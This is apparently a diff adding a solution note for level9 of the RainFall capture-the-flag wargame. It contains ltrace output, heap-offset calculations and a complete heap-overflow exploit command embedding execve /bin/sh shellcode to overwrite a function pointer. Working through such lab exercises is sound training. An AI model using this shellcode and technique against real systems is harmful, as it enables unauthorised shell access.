@@ -1,0 +1,24 @@
+level9@RainFall:~$ ltrace ./level9 test 2>&1 | c++filt
+__libc_start_main(0x80485f4, 2, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
+std::ios_base::Init::Init()(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
+operator new(unsigned int)(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280) = 0x804a008           ==> 134520840
+operator new(unsigned int)(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280) = 0x804a078                    ==> 134520952
+strlen("test")                                   = 4
+memcpy(0x0804a00c, "test", 4)                    = 0x0804a00c
+std::ios_base::Init::~Init()(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
++++ exited (status 11) +++
+
+134520844
+
+134520952 - 134520840 = 112
+
+func is before annotation by 4 bytes
+Shellcode size = 28 bytes
+function pointer size= 4 bytes
+
+112 - 4 - 28 - 4 = 76
+
+0x0804a00c + 4 = 0x0804a010
+
+./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08")')
